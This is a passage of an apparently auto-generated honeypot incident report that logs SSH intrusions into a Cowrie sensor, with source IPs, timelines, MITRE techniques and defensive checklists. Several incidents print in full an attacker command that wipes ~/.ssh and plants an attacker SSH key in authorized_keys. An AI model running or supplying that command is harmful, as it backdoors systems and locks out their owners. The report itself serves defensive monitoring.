| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:04:30` | `cowrie.session.connect` |
| `2026-07-05 12:04:30` | `cowrie.client.version` |
| `2026-07-05 12:04:30` | `cowrie.client.kex` |
| `2026-07-05 12:04:30` | `cowrie.login.success` |
| `2026-07-05 12:04:31` | `cowrie.session.params` |
| `2026-07-05 12:04:31` | `cowrie.command.input` |
| `2026-07-05 12:04:31` | `cowrie.command.failed` |
| `2026-07-05 12:04:31` | `cowrie.log.closed` |
| `2026-07-05 12:04:32` | `cowrie.session.params` |
| `2026-07-05 12:04:32` | `cowrie.command.input` |
| `2026-07-05 12:04:32` | `cowrie.session.file_download` |
| `2026-07-05 12:04:32` | `cowrie.log.closed` |
| `2026-07-05 12:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8f73e7eea7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-05 12:04 |
| **Last Seen** | 2026-07-05 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:04:32` | `cowrie.session.connect` |
| `2026-07-05 12:04:32` | `cowrie.client.version` |
| `2026-07-05 12:04:32` | `cowrie.client.kex` |
| `2026-07-05 12:04:33` | `cowrie.login.success` |
| `2026-07-05 12:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be1fc73e708

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-07-05 12:04 |
| **Last Seen** | 2026-07-05 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:04:33` | `cowrie.session.connect` |
| `2026-07-05 12:04:33` | `cowrie.client.version` |
| `2026-07-05 12:04:33` | `cowrie.client.kex` |
| `2026-07-05 12:04:33` | `cowrie.login.success` |
| `2026-07-05 12:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a388ce318d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]75` |
| **First Seen** | 2026-07-05 12:06 |
| **Last Seen** | 2026-07-05 12:11 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:06:07` | `cowrie.session.connect` |
| `2026-07-05 12:06:07` | `cowrie.client.version` |
| `2026-07-05 12:06:07` | `cowrie.client.kex` |
| `2026-07-05 12:06:08` | `cowrie.login.success` |
| `2026-07-05 12:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]75` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3998198f45c3

| Field | Detail |
|---|---|
| **Source IP** | `129.121.42[.]131` |
| **First Seen** | 2026-07-05 12:07 |
| **Last Seen** | 2026-07-05 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:07:12` | `cowrie.session.connect` |
| `2026-07-05 12:07:12` | `cowrie.client.version` |
| `2026-07-05 12:07:12` | `cowrie.client.kex` |
| `2026-07-05 12:07:12` | `cowrie.login.success` |
| `2026-07-05 12:07:13` | `cowrie.session.params` |
| `2026-07-05 12:07:13` | `cowrie.command.input` |
| `2026-07-05 12:07:13` | `cowrie.command.failed` |
| `2026-07-05 12:07:14` | `cowrie.log.closed` |
| `2026-07-05 12:07:14` | `cowrie.session.params` |
| `2026-07-05 12:07:14` | `cowrie.command.input` |
| `2026-07-05 12:07:15` | `cowrie.session.file_download` |
| `2026-07-05 12:07:15` | `cowrie.log.closed` |
| `2026-07-05 12:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.42[.]131` to AbuseIPDB if not already reported
- [ ] Block `129.121.42[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c090084c7a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.42[.]131` |
| **First Seen** | 2026-07-05 12:07 |
| **Last Seen** | 2026-07-05 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:07:15` | `cowrie.session.connect` |
| `2026-07-05 12:07:15` | `cowrie.client.version` |
| `2026-07-05 12:07:15` | `cowrie.client.kex` |
| `2026-07-05 12:07:15` | `cowrie.login.success` |
| `2026-07-05 12:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.42[.]131` to AbuseIPDB if not already reported
- [ ] Block `129.121.42[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9677d8d31399

| Field | Detail |
|---|---|
| **Source IP** | `129.121.42[.]131` |
| **First Seen** | 2026-07-05 12:07 |
| **Last Seen** | 2026-07-05 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:07:16` | `cowrie.session.connect` |
| `2026-07-05 12:07:16` | `cowrie.client.version` |
| `2026-07-05 12:07:16` | `cowrie.client.kex` |
| `2026-07-05 12:07:16` | `cowrie.login.success` |
| `2026-07-05 12:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.42[.]131` to AbuseIPDB if not already reported
- [ ] Block `129.121.42[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8137cdc4a0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 12:10 |
| **Last Seen** | 2026-07-05 12:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:10:56` | `cowrie.session.connect` |
| `2026-07-05 12:10:59` | `cowrie.client.version` |
| `2026-07-05 12:10:59` | `cowrie.client.kex` |
| `2026-07-05 12:11:03` | `cowrie.login.success` |
| `2026-07-05 12:11:05` | `cowrie.session.params` |
| `2026-07-05 12:11:05` | `cowrie.command.input` |
| `2026-07-05 12:11:07` | `cowrie.log.closed` |
| `2026-07-05 12:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774c5461cb00

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 12:12 |
| **Last Seen** | 2026-07-05 12:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:12:55` | `cowrie.session.connect` |
| `2026-07-05 12:12:55` | `cowrie.client.version` |
| `2026-07-05 12:12:55` | `cowrie.client.kex` |
| `2026-07-05 12:12:56` | `cowrie.login.success` |
| `2026-07-05 12:12:56` | `cowrie.direct-tcpip.request` |
| `2026-07-05 12:12:56` | `cowrie.direct-tcpip.data` |
| `2026-07-05 12:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58aa2301a8ac

| Field | Detail |
|---|---|
| **Source IP** | `152.32.174[.]171` |
| **First Seen** | 2026-07-05 12:13 |
| **Last Seen** | 2026-07-05 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:13:50` | `cowrie.session.connect` |
| `2026-07-05 12:13:50` | `cowrie.telnet.option` |
| `2026-07-05 12:13:51` | `cowrie.telnet.option` |
| `2026-07-05 12:14:51` | `cowrie.login.success` |
| `2026-07-05 12:14:51` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `152.32.174[.]171` to AbuseIPDB if not already reported
- [ ] Block `152.32.174[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29393bbcce7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-05 12:14 |
| **Last Seen** | 2026-07-05 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:14:04` | `cowrie.session.connect` |
| `2026-07-05 12:14:04` | `cowrie.client.version` |
| `2026-07-05 12:14:04` | `cowrie.client.kex` |
| `2026-07-05 12:14:05` | `cowrie.login.success` |
| `2026-07-05 12:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4218b139e74

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-05 12:14 |
| **Last Seen** | 2026-07-05 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:14:04` | `cowrie.session.connect` |
| `2026-07-05 12:14:04` | `cowrie.client.version` |
| `2026-07-05 12:14:05` | `cowrie.client.kex` |
| `2026-07-05 12:14:05` | `cowrie.login.success` |
| `2026-07-05 12:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43fef282bd42

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 12:22 |
| **Last Seen** | 2026-07-05 12:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:22:29` | `cowrie.session.connect` |
| `2026-07-05 12:22:30` | `cowrie.client.version` |
| `2026-07-05 12:22:30` | `cowrie.client.kex` |
| `2026-07-05 12:22:36` | `cowrie.login.success` |
| `2026-07-05 12:22:40` | `cowrie.session.params` |
| `2026-07-05 12:22:40` | `cowrie.command.input` |
| `2026-07-05 12:22:42` | `cowrie.log.closed` |
| `2026-07-05 12:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edc6e573015

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 12:24 |
| **Last Seen** | 2026-07-05 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:24:36` | `cowrie.session.connect` |
| `2026-07-05 12:24:36` | `cowrie.client.version` |
| `2026-07-05 12:24:36` | `cowrie.client.kex` |
| `2026-07-05 12:24:36` | `cowrie.login.success` |
| `2026-07-05 12:24:37` | `cowrie.session.params` |
| `2026-07-05 12:24:37` | `cowrie.command.input` |
| `2026-07-05 12:24:37` | `cowrie.log.closed` |
| `2026-07-05 12:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8bf82339cf1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 12:34 |
| **Last Seen** | 2026-07-05 12:34 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:34:08` | `cowrie.session.connect` |
| `2026-07-05 12:34:11` | `cowrie.client.version` |
| `2026-07-05 12:34:11` | `cowrie.client.kex` |
| `2026-07-05 12:34:17` | `cowrie.login.success` |
| `2026-07-05 12:34:21` | `cowrie.session.params` |
| `2026-07-05 12:34:21` | `cowrie.command.input` |
| `2026-07-05 12:34:22` | `cowrie.log.closed` |
| `2026-07-05 12:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2c3e4645ec

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]161` |
| **First Seen** | 2026-07-05 12:39 |
| **Last Seen** | 2026-07-05 12:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:39:09` | `cowrie.session.connect` |
| `2026-07-05 12:39:09` | `cowrie.client.version` |
| `2026-07-05 12:39:09` | `cowrie.client.kex` |
| `2026-07-05 12:39:12` | `cowrie.login.success` |
| `2026-07-05 12:39:13` | `cowrie.session.params` |
| `2026-07-05 12:39:13` | `cowrie.command.input` |
| `2026-07-05 12:39:14` | `cowrie.log.closed` |
| `2026-07-05 12:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]161` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9738e4b19e

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-07-05 12:41 |
| **Last Seen** | 2026-07-05 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:41:25` | `cowrie.session.connect` |
| `2026-07-05 12:41:25` | `cowrie.client.version` |
| `2026-07-05 12:41:25` | `cowrie.client.kex` |
| `2026-07-05 12:41:27` | `cowrie.login.success` |
| `2026-07-05 12:41:28` | `cowrie.session.params` |
| `2026-07-05 12:41:28` | `cowrie.command.input` |
| `2026-07-05 12:41:28` | `cowrie.command.failed` |
| `2026-07-05 12:41:28` | `cowrie.log.closed` |
| `2026-07-05 12:41:29` | `cowrie.session.params` |
| `2026-07-05 12:41:29` | `cowrie.command.input` |
| `2026-07-05 12:41:29` | `cowrie.session.file_download` |
| `2026-07-05 12:41:29` | `cowrie.log.closed` |
| `2026-07-05 12:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9262245792aa

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-07-05 12:41 |
| **Last Seen** | 2026-07-05 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:41:30` | `cowrie.session.connect` |
| `2026-07-05 12:41:30` | `cowrie.client.version` |
| `2026-07-05 12:41:30` | `cowrie.client.kex` |
| `2026-07-05 12:41:31` | `cowrie.login.success` |
| `2026-07-05 12:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d64e3b589f

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-07-05 12:41 |
| **Last Seen** | 2026-07-05 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:41:31` | `cowrie.session.connect` |
| `2026-07-05 12:41:31` | `cowrie.client.version` |
| `2026-07-05 12:41:32` | `cowrie.client.kex` |
| `2026-07-05 12:41:33` | `cowrie.login.success` |
| `2026-07-05 12:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880daa1cec34

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-05 12:42 |
| **Last Seen** | 2026-07-05 12:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:42:14` | `cowrie.session.connect` |
| `2026-07-05 12:42:14` | `cowrie.client.version` |
| `2026-07-05 12:42:14` | `cowrie.client.kex` |
| `2026-07-05 12:42:15` | `cowrie.login.success` |
| `2026-07-05 12:42:16` | `cowrie.session.params` |
| `2026-07-05 12:42:16` | `cowrie.command.input` |
| `2026-07-05 12:42:16` | `cowrie.command.failed` |
| `2026-07-05 12:42:17` | `cowrie.log.closed` |
| `2026-07-05 12:42:17` | `cowrie.session.params` |
| `2026-07-05 12:42:17` | `cowrie.command.input` |
| `2026-07-05 12:42:18` | `cowrie.session.file_download` |
| `2026-07-05 12:42:18` | `cowrie.log.closed` |
| `2026-07-05 12:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8255b036bace

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-05 12:42 |
| **Last Seen** | 2026-07-05 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:42:18` | `cowrie.session.connect` |
| `2026-07-05 12:42:18` | `cowrie.client.version` |
| `2026-07-05 12:42:18` | `cowrie.client.kex` |
| `2026-07-05 12:42:19` | `cowrie.login.success` |
| `2026-07-05 12:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e071e1d9c4da

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-05 12:42 |
| **Last Seen** | 2026-07-05 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:42:20` | `cowrie.session.connect` |
| `2026-07-05 12:42:20` | `cowrie.client.version` |
| `2026-07-05 12:42:20` | `cowrie.client.kex` |
| `2026-07-05 12:42:21` | `cowrie.login.success` |
| `2026-07-05 12:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2cf27ae3b63

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-07-05 12:43 |
| **Last Seen** | 2026-07-05 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:43:02` | `cowrie.session.connect` |
| `2026-07-05 12:43:02` | `cowrie.client.version` |
| `2026-07-05 12:43:03` | `cowrie.client.kex` |
| `2026-07-05 12:43:03` | `cowrie.login.success` |
| `2026-07-05 12:43:04` | `cowrie.session.params` |
| `2026-07-05 12:43:04` | `cowrie.command.input` |
| `2026-07-05 12:43:04` | `cowrie.command.failed` |
| `2026-07-05 12:43:04` | `cowrie.log.closed` |
| `2026-07-05 12:43:04` | `cowrie.session.params` |
| `2026-07-05 12:43:04` | `cowrie.command.input` |
| `2026-07-05 12:43:05` | `cowrie.session.file_download` |
| `2026-07-05 12:43:05` | `cowrie.log.closed` |
| `2026-07-05 12:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44f98d4fed3

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-07-05 12:43 |
